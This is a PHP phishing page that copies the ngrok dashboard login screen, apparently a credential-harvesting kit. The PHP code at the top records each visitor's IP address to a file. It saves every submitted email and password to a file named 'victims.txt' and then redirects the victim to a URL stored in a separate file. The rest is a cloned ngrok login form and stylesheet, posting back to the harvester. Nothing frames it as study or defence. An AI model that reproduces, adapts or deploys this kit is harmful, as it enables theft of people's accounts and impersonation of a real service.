<?php
function get_IP_address()
{
    foreach (array('HTTP_CLIENT_IP',
                   'HTTP_X_FORWARDED_FOR',
                   'HTTP_X_FORWARDED',
                   'HTTP_X_CLUSTER_CLIENT_IP',
                   'HTTP_FORWARDED_FOR',
                   'HTTP_FORWARDED',
                   'REMOTE_ADDR') as $key){
        if (array_key_exists($key, $_SERVER) === true){
            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
                $IPaddress = trim($IPaddress); // Just to be safe

                if (filter_var($IPaddress,
                               FILTER_VALIDATE_IP,
                               FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
                    !== false) {

                    return $IPaddress;
                }
            }
        }
    }
}
fwrite(fopen('ip.txt','w'),get_IP_address());
$u = $_POST['email'];
$p = $_POST['password'];
$f = fopen('redir.txt','r');
$r = fread($f,filesize("redir.txt"));    
fclose($f);
if ($u && $p){
  $f = fopen('victims.txt','w+');
  fwrite($f,'USERNAME : '.$u.' PASSWORD : '.$p."\n");
  fclose($f);
  echo "<script>window.open('".$r."','_top')</script>";  
}
?>
<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>
.anticon {
  display: inline-block;
  color: inherit;
  font-style: normal;
  line-height: 0;
  text-align: center;
  text-transform: none;
  vertical-align: -0.125em;
  text-rendering: optimizeLegibility;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

.anticon > * {
  line-height: 1;
}

.anticon svg {
  display: inline-block;
}

.anticon::before {
  display: none;
}

.anticon .anticon-icon {
  display: block;
}

.anticon[tabindex] {
  cursor: pointer;
}

.anticon-spin::before,
.anticon-spin {
  display: inline-block;
  -webkit-animation: loadingCircle 1s infinite linear;
  animation: loadingCircle 1s infinite linear;
}

@-webkit-keyframes loadingCircle {
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}

@keyframes loadingCircle {
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}
</style>
    
    
    <script>
    window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
    ga('create', 'UA-41575845-1', 'auto');
    ga('send', 'pageview');
    </script>
    <script async="" src="./ngrok_files/analytics.js"></script>
    

    <title>ngrok - secure introspectable tunnels to localhost</title>

    
    <meta name="description" content="ngrok secure introspectable tunnels to localhost webhook development tool and debugging tool">
    <meta name="author" content="inconshreveable">

    <link rel="shortcut icon" type="image/x-icon" href="https://dashboard.ngrok.com/static/favicon.ico">
    <link rel="stylesheet" type="text/css" href="./ngrok_files/vendor.1983ed62868ce286720e.css">

    <link rel="stylesheet" type="text/css" href="./ngrok_files/app_unauth.10a952e383bc5c7efa0e.css">
  <iframe hidden="" src="./ngrok_files/saved_resource.html"></iframe></head>
  <body>
    <div id="data" data-urls="Cig2TGU1XzBFVUFBQUFBSEd4NkhaTGgzUzJWQ3QxN0R4d19ZNmFmWm1qEoUBCgYvbG9naW4SDS9sb2dpbi9nb29nbGUaDS9sb2dpbi9naXRodWIiBy9zaWdudXAqDy9wYXNzd29yZC9yZXNldDIZaHR0cHM6Ly9uZ3Jvay5jb20vcHJpdmFjeToVaHR0cHM6Ly9uZ3Jvay5jb20vdG9zQhFodHRwczovL25ncm9rLmNvbQ==" data-csrf-token="4od+0n+MK3kihOTBGLHQ4q8mKjxoCvKrfw6WuLKo3mdjzT+FrKIIb2dFkqIr3tbgKnKxbqaia6aVFpvL76ZEFA==" data-release-version="d829c116f"></div>
    
<div id="root"><section class="ant-layout" style="height: 100vh; overflow: auto;"><section class="ant-layout"><div class="ant-row ant-row-center" style="row-gap: 0px;"><div class="ant-col" style="flex: 0 0 354px;"><div class="ant-row ant-row-center" style="margin-top: 80px; margin-bottom: 32px; row-gap: 0px;"><a href="https://ngrok.com/"><span role="img" alt="ngrok" class="anticon" style="color: rgb(24, 83, 219); font-size: 3.5em;"><svg id="ngrok" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 72" fill="currentColor" width="2.66666666667em" height="1em"><path id="n" d="M32.94 25.575a12.606 12.606 0 00-2.078-1.927 12.149 12.149 0 00-2.162-1.274 10.006 10.006 0 00-1.174-.442 13.5 13.5 0 00-1.9-.432h-8.35l-5.521 6.293v-6.162H.05v33.2h11.712V32.43h11l.914-.02v22.412h11.713V34.056a19.842 19.842 0 00-.512-4.727 9.223 9.223 0 00-1.937-3.754z"></path><path id="g" d="M65.619 25.033a12.872 12.872 0 00-9.9-4.406 15.942 15.942 0 00-6.695 1.395 16.425 16.425 0 00-5.309 3.814 18.287 18.287 0 00-3.523 5.7 19.053 19.053 0 00-1.292 7.087 18.866 18.866 0 001.2 6.835 15.1 15.1 0 008.511 8.7 16.911 16.911 0 006.534 1.235 18.069 18.069 0 002.97-.231 11.735 11.735 0 002.59-.743A15.166 15.166 0 0063.13 53.1a20.838 20.838 0 002.489-2.038v8.7h-.01v.838h-10.96l-8.24 9.274v1.6h30.922V21.541H65.619zm-.03 15.948a8.489 8.489 0 01-1.616 2.429 7.179 7.179 0 01-2.389 1.616 7.453 7.453 0 01-2.941.582 7.625 7.625 0 01-3.011-.582 7.206 7.206 0 01-2.4-1.616 7.8 7.8 0 01-1.586-2.429 7.656 7.656 0 01-.582-3.011 6.936 6.936 0 01.612-2.91 7.53 7.53 0 011.658-2.36 8.361 8.361 0 012.389-1.616 6.948 6.948 0 012.91-.612 7.6 7.6 0 015.31 2.2A8.311 8.311 0 0165.6 35.06a7.11 7.11 0 01.612 2.981 7.329 7.329 0 01-.623 2.94z"></path><path id="r" d="M111.777 21.541H99l-5.078 5.72v-5.72H82.2v33.2h11.742l.01-22.221h8.521L111.777 22z"></path><path id="o" d="M142.5 25.324a19.523 19.523 0 00-6.343-3.683 23.112 23.112 0 00-7.929-1.325 22.785 22.785 0 00-7.989 1.355 19.861 19.861 0 00-6.313 3.714 16.969 16.969 0 00-4.145 5.57 16.149 16.149 0 00-1.486 6.9 17.911 17.911 0 001.486 7.407 17.017 17.017 0 004.115 5.721 18.194 18.194 0 006.242 3.693 23.336 23.336 0 007.9 1.3 24.413 24.413 0 008.06-1.3 18.519 18.519 0 006.373-3.663 17.2 17.2 0 004.175-5.631 16.863 16.863 0 001.526-7.216 17.341 17.341 0 00-1.486-7.216 16.848 16.848 0 00-4.186-5.626zm-7.317 15.718a8.475 8.475 0 01-1.616 2.429 7.177 7.177 0 01-2.388 1.615 7.735 7.735 0 01-5.892 0 7.077 7.077 0 01-2.388-1.615 8.275 8.275 0 01-1.616-2.429 7.455 7.455 0 01-.613-3.072 6.936 6.936 0 01.613-2.91 8.348 8.348 0 011.616-2.389 7.047 7.047 0 012.388-1.616 7.747 7.747 0 015.892 0 6.951 6.951 0 012.388 1.616 8.275 8.275 0 011.616 2.429 7.142 7.142 0 01.613 2.941 7.29 7.29 0 01-.614 3.001z"></path><path id="k" d="M175.068 36.876l16.018-14.773v-.562H175.65l-12.285 11.973V1.026h-11.713v53.706h11.713v-13.52l12.877 13.52h15.808v-.633l-16.982-17.223z"></path></svg></span></a></div><div class="page__xsmallWidth__398-e"><div class="ant-card ant-card-bordered"><div class="ant-card-body"><h2 class="ant-typography" style="text-align: center;">Log in</h2><form class="ant-form ant-form-vertical ant-form-hide-required-mark" method="post" action=''><div class="ant-row ant-form-item" style="row-gap: 0px;"><div class="ant-col ant-form-item-label"><label for="email" class="ant-form-item-required" title="E-mail">E-mail</label></div><div class="ant-col ant-form-item-control"><div class="ant-form-item-control-input"><div class="ant-form-item-control-input-content"><input autocomplete="email" type="text" id="email" name="email" class="ant-input" value=""></div></div></div></div><div class="ant-row ant-form-item" style="row-gap: 0px;"><div class="ant-col ant-form-item-label"><label for="password" class="ant-form-item-required" title="Password">Password</label></div><div class="ant-col ant-form-item-control"><div class="ant-form-item-control-input"><div class="ant-form-item-control-input-content"><span class="ant-input-affix-wrapper ant-input-password"><input autocomplete="current-password" action="click" id="password" name="password" type="password" class="ant-input"><span class="ant-input-suffix"><span role="img" aria-label="eye-invisible" tabindex="-1" class="anticon anticon-eye-invisible ant-input-password-icon"><svg viewBox="64 64 896 896" focusable="false" data-icon="eye-invisible" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M942.2 486.2Q889.47 375.11 816.7 305l-50.88 50.88C807.31 395.53 843.45 447.4 874.7 512 791.5 684.2 673.4 766 512 766q-72.67 0-133.87-22.38L323 798.75Q408 838 512 838q288.3 0 430.2-300.3a60.29 60.29 0 000-51.5zm-63.57-320.64L836 122.88a8 8 0 00-11.32 0L715.31 232.2Q624.86 186 512 186q-288.3 0-430.2 300.3a60.3 60.3 0 000 51.5q56.69 119.4 136.5 191.41L112.48 835a8 8 0 000 11.31L155.17 889a8 8 0 0011.31 0l712.15-712.12a8 8 0 000-11.32zM149.3 512C232.6 339.8 350.7 258 512 258c54.54 0 104.13 9.36 149.12 28.39l-70.3 70.3a176 176 0 00-238.13 238.13l-83.42 83.42C223.1 637.49 183.3 582.28 149.3 512zm246.7 0a112.11 112.11 0 01146.2-106.69L401.31 546.2A112 112 0 01396 512z"></path><path d="M508 624c-3.46 0-6.87-.16-10.25-.47l-52.82 52.82a176.09 176.09 0 00227.42-227.42l-52.82 52.82c.31 3.38.47 6.79.47 10.25a111.94 111.94 0 01-112 112z"></path></svg></span></span></span></div></div></div></div><div class="ant-row ant-form-item" style="row-gap: 0px;"><div class="ant-col ant-form-item-control"><div class="ant-form-item-control-input"><div class="ant-form-item-control-input-content"><button type="submit" class="ant-btn ant-btn-primary ant-btn-block"><span>Log in</span></button></div></div></div></div></form><a href="https://dashboard.ngrok.com/password/reset">I forgot my password</a><div class="ant-divider ant-divider-horizontal ant-divider-with-text ant-divider-with-text-center" role="separator"><span class="ant-divider-inner-text">or</span></div><a href="https://dashboard.ngrok.com/login/github" target='_blank' class="ant-btn ant-btn-block" style="margin-bottom: 8px;"><span role="img" aria-label="github" class="anticon anticon-github"><svg viewBox="64 64 896 896" focusable="false" data-icon="github" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M511.6 76.3C264.3 76.2 64 276.4 64 523.5 64 718.9 189.3 885 363.8 946c23.5 5.9 19.9-10.8 19.9-22.2v-77.5c-135.7 15.9-141.2-73.9-150.3-88.9C215 726 171.5 718 184.5 703c30.9-15.9 62.4 4 98.9 57.9 26.4 39.1 77.9 32.5 104 26 5.7-23.5 17.9-44.5 34.7-60.8-140.6-25.2-199.2-111-199.2-213 0-49.5 16.3-95 48.3-131.7-20.4-60.5 1.9-112.3 4.9-120 58.1-5.2 118.5 41.6 123.2 45.3 33-8.9 70.7-13.6 112.9-13.6 42.4 0 80.2 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.3-43.9 2.9 7.7 24.7 58.3 5.5 118 32.4 36.8 48.9 82.7 48.9 132.3 0 102.2-59 188.1-200 212.9a127.5 127.5 0 0138.1 91v112.5c.8 9 0 17.9 15 17.9 177.1-59.7 304.6-227 304.6-424.1 0-247.2-200.4-447.3-447.5-447.3z"></path></svg></span><span>Log in with Github</span></a><a href="https://dashboard.ngrok.com/login/google" target='_blank' class="ant-btn ant-btn-block"><span role="img" class="anticon"><svg width="1em" height="1em" viewBox="0 0 533.5 544.3" xmlns="http://www.w3.org/2000/svg"><g><path fill="#4285F4" d="M533.5,278.4c0-18.5-1.5-37.1-4.7-55.3H272.1v104.8h147c-6.1,33.8-25.7,63.7-54.4,82.7v68h87.7
        C503.9,431.2,533.5,361.2,533.5,278.4z"></path><path fill="#34A853" d="M272.1,544.3c73.4,0,135.3-24.1,180.4-65.7l-87.7-68c-24.4,16.6-55.9,26-92.6,26c-71,0-131.2-47.9-152.8-112.3
        H28.9v70.1C75.1,486.3,169.2,544.3,272.1,544.3z"></path><path fill="#FBBC04" d="M119.3,324.3c-11.4-33.8-11.4-70.4,0-104.2V150H28.9c-38.6,76.9-38.6,167.5,0,244.4L119.3,324.3z"></path><path fill="#EA4335" d="M272.1,107.7c38.8-0.6,76.3,14,104.4,40.8l0,0l77.7-77.7C405,24.6,339.7-0.8,272.1,0C169.2,0,75.1,58,28.9,150
        l90.4,70.1C140.8,155.6,201.1,107.7,272.1,107.7z"></path></g></svg></span><span>Log in with Google</span></a></div></div><div class="ant-row ant-row-center" style="margin-top: 16px; row-gap: 0px;"><div class="ant-typography">Don't have an account?</div></div><div class="ant-row ant-row-center" style="row-gap: 0px;"><a href="https://dashboard.ngrok.com/signup" class="ant-btn"><span>Sign up for free!</span></a></div></div></div></div></section></section></div>


    <script src="./ngrok_files/vendor.a91a3358d008529e9914.js"></script>
    <script src="./ngrok_files/rpx.a5fc21730874524fa535.js"></script>
    <script src="./ngrok_files/app_unauth.76f3e156cfc6d4fc1953.js"></script>
  

</body></html>